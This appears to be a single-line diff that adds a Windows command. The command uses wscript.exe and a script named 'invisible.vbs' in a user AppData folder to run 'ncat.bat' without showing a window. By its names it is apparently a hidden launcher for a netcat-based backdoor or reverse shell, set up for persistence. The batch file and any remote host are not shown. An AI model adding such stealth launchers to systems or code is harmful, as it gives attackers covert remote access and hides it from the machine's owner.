@@ -1,0 +1,1 @@
+wscript.exe "%userprofile%\AppData\local\yess\invisible.vbs" "%userprofile%\AppData\local\yess\ncat.bat"
